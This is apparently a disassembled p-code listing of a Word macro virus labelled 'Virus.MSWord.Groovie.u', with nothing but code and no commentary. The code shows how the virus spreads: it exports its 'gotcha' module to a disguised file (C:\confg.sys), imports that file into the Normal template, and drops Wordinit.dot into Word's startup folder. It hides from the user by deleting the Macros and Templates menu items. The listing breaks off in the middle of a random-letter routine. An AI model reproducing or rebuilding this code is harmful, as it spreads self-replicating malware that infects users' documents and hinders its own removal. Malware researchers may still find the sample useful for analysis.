in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Groovie.u
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/gotcha - 43973 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn target (As String)
' Line #1:
' 	Dim (Public) 
' 	VarDefn Init (As Boolean)
' Line #2:
' 	Dim (Public) 
' 	VarDefn norminfd (As Boolean)
' Line #3:
' 	Dim (Public) 
' 	VarDefn Docinfd (As Boolean)
' Line #4:
' 	Dim (Public) 
' 	VarDefn Armor (As Boolean)
' Line #5:
' 	Dim (Public) 
' 	VarDefn DocName (As String)
' Line #6:
' 	Dim (Public) 
' 	VarDefn Scan_For_Doc (As Boolean)
' Line #7:
' 	Dim (Public) 
' 	VarDefn Exitt_Word (As Boolean)
' Line #8:
' 	FuncDefn (Function ID_check())
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #11:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #12:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #13:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #14:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Eq 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0006 "normal"
' 	St target 
' Line #16:
' 	GoTo checkout 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "document"
' 	St target 
' 	EndIf 
' Line #19:
' 	Ld MacroContainer 
' 	LitStr 0x000C "Wordinit.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0004 "Trix"
' 	St target 
' 	EndIf 
' Line #20:
' 	Label checkout 
' Line #21:
' 	EndFunc 
' Line #22:
' 	FuncDefn (Function Vir_status())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #25:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #26:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #27:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #28:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\Wordinit.dot"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x000C "Wordinit.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Init 
' 	EndIf 
' Line #29:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #30:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "gotcha"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Docinfd 
' 	EndIf 
' Line #31:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #33:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "gotcha"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St norminfd 
' 	EndIf 
' Line #34:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #35:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Armor 
' 	EndIf 
' Line #36:
' 	EndFunc 
' Line #37:
' 	FuncDefn (Function Gotcha_Main())
' Line #38:
' 	OnError (Resume Next) 
' Line #39:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #40:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #41:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #42:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #43:
' 	ArgsCall (Call) ID_check 0x0000 
' Line #44:
' 	ArgsCall (Call) Vir_status 0x0000 
' Line #45:
' 	ArgsCall (Call) Export_Status 0x0000 
' Line #46:
' 	Ld target 
' 	LitStr 0x0008 "document"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Docinf_code 0x0000 
' 	EndIf 
' Line #47:
' 	Ld target 
' 	LitStr 0x0006 "normal"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Norminf_code 0x0000 
' 	EndIf 
' Line #48:
' 	Ld target 
' 	LitStr 0x0004 "Trix"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Trix_code 0x0000 
' 	EndIf 
' Line #49:
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #50:
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #51:
' 	EndFunc 
' Line #52:
' 	FuncDefn (Function Export_Status())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #55:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #56:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #57:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #58:
' 	EndFunc 
' Line #59:
' 	FuncDefn (Function Docinf_code())
' Line #60:
' 	OnError (Resume Next) 
' Line #61:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #62:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #63:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #64:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #65:
' 	Ld norminfd 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #66:
' 	StartWithExpr 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	With 
' Line #67:
' 	StartWithExpr 
' 	LitStr 0x000C "C:\confg.sys"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #68:
' 	EndWith 
' Line #69:
' 	EndWith 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	LitVarSpecial (False)
' 	St Init 
' Line #72:
' Line #73:
' 	Ld Init 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #74:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #75:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #76:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #77:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #78:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\Wordinit.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #79:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #80:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #81:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St x 
' Line #82:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St A$ 
' 	EndIf 
' Line #83:
' 	Ld x 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St A$ 
' 	EndIf 
' Line #84:
' 	Ld x 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St A$ 
' 	EndIf 
' Line #85:
' 	Ld x 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St A$ 
' 	EndIf 
' Line #86:
' 	Ld x 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St A$ 
' 	EndIf 
' Line #87:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St A$ 
' 	EndIf 
' Line #88:
' 	Ld x 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St A$ 
' 	EndIf 
' Line #89:
' 	Ld x 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St A$ 
' 	EndIf 
' Line #90:
' 	Ld x 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St A$ 
' 	EndIf 
' Line #91:
' 	Ld x 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St A$ 
' 	EndIf 
' Line #92:
' 	Ld x 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St A$ 
' 	EndIf 
' Line #93:
' 	Ld x 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St A$ 
' 	EndIf 
' Line #94:
' 	Ld x 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St A$ 
' 	EndIf 
' Line #95:
' 	Ld x 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St A$ 
' 	EndIf 
' Line #96:
' 	Ld x 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St A$ 
' 	EndIf 
' Line #97:
' 	Ld x 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St A$ 
' 	EndIf 
' Line #98:
' 	Ld x 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St A$ 
' 	EndIf 
' Line #99:
' 	Ld x 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St A$ 
' 	EndIf 
' Line #100:
' 	Ld x 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St A$ 
' 	EndIf 
' Line #101:
' 	Ld x 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St A$ 
' 	EndIf 
' Line #102:
' 	Ld x 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St A$ 
' 	EndIf 
' Line #103:
' 	Ld x 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St A$ 
' 	EndIf 
' Line #104:
' 	Ld x 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St A$ 
' 	EndIf 
' Line #105:
' 	Ld x 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St A$ 
' 	EndIf 
' Line #106:
' 	Ld x 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St A$ 
' 	EndIf 
' Line #107:
' 	Ld x 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St A$ 
' 	EndIf 
' Line #108:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St s 
' Line #109:
' 	Ld s 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St C$ 
' 	EndIf 
' Line #110:
' 	Ld s 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St C$ 
' 	EndIf 
' Line #111:
' 	Ld s 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St C$ 
' 	EndIf 
' Line #112:
' 	Ld s 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St C$ 
' 	EndIf 
' Line #113:
' 	Ld s 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St C$ 
' 	EndIf 
' Line #114:
' 	Ld s 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St C$ 
' 	EndIf 
' Line #115:
' 	Ld s 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St C$ 
' 	EndIf 
' Line #116:
' 	Ld s 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St C$ 
' 	EndIf 
' Line #117:
' 	Ld s 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St C$ 
' 	EndIf 
' Line #118:
' 	Ld s 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St C$ 
' 	EndIf 
' Line #119:
' 	Ld s 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St C$ 
' 	EndIf 
' Line #120:
' 	Ld s 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St C$ 
' 	EndIf 
' Line #121:
' 	Ld s 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St C$ 
' 	EndIf 
' Line #122:
' 	Ld s 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St C$ 
' 	EndIf 
' Line #123:
' 	Ld s 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St C$ 
' 	EndIf 
' Line #124:
' 	Ld s 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St C$ 
' 	EndIf 
' Line #125:
' 	Ld s 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St C$ 
' 	EndIf 
' Line #126:
' 	Ld s 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St C$ 
' 	EndIf 
' Line #127:
' 	Ld s 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St C$ 
' 	EndIf 
' Line #128:
' 	Ld s 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St C$ 
' 	EndIf 
' Line #129:
' 	Ld s 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St C$ 
' 	EndIf 
' Line #130:
' 	Ld s 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St C$ 
' 	EndIf 
' Line #131:
' 	Ld s 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St C$ 
' 	EndIf 
' Line #132:
' 	Ld s 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St C$ 
' 	EndIf 
' Line #133:
' 	Ld s 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St C$ 
' 	EndIf 
' Line #134:
' 	Ld s 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St C$ 
' 	EndIf 
' Line #135:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St q 
' Line #136:
' 	Ld q 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St D$ 
' 	EndIf 
' Line #137:
' 	Ld q 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St D$ 
' 	EndIf 
' Line #138:
' 	Ld q 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St D$ 
' 	EndIf 
' Line #139:
' 	Ld q 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St D$ 
' 	EndIf 
' Line #140:
' 	Ld q 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St D$ 
' 	EndIf 
' Line #141:
' 	Ld q 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St D$ 
' 	EndIf 
' Line #142:
' 	Ld q 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St D$ 
' 	EndIf 
' Line #143:
' 	Ld q 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St D$ 
' 	EndIf 
' Line #144:
' 	Ld q 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St D$ 
' 	EndIf 
' Line #145:
' 	Ld q 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St D$ 
' 	EndIf 
' Line #146:
' 	Ld q 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St D$ 
' 	EndIf 
' Line #147:
' 	Ld q 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St D$ 
' 	EndIf 
' Line #148:
' 	Ld q 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St D$ 
' 	EndIf 
' Line #149:
' 	Ld q 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St D$ 
' 	EndIf 
' Line #150:
' 	Ld q 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St D$ 
' 	EndIf 
' Line #151:
' 	Ld q 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St D$ 
' 	EndIf 
' Line #152:
' 	Ld q 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St D$ 
' 	EndIf 
' Line #153:
' 	Ld q 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St D$ 
' 	EndIf 
' Line #154:
' 	Ld q 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St D$ 
' 	EndIf 
' Line #155:
' 	Ld q 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St D$ 
' 	EndIf 
' Line #156:
' 	Ld q 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St D$ 
' 	EndIf 
' Line #157:
' 	Ld q 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St D$ 
' 	EndIf 
' Line #158:
' 	Ld q 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St D$ 
' 	EndIf 
' Line #159:
' 	Ld q 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St D$ 
' 	EndIf 
' Line #160:
' 	Ld q 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St D$ 
' 	EndIf 
' Line #161:
' 	Ld q 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St D$ 
' 	EndIf 
' Line #162:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St w 
' Line #163:
' 	Ld w 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St E$ 
' 	EndIf 
' Line #164:
' 	Ld w 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St E$ 
' 	EndIf 
' Line #165:
' 	Ld w 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St E$ 
' 	EndIf 
' Line #166:
' 	Ld w 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St E$ 
' 	EndIf 
' Line #167:
' 	Ld w 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St E$ 
' 	EndIf 
' Line #168:
' 	Ld w 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St E$ 
' 	EndIf 
' Line #169:
' 	Ld w 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St E$ 
' 	EndIf 
' Line #170:
' 	Ld w 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St E$ 
' 	EndIf 
' Line #171:
' 	Ld w 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
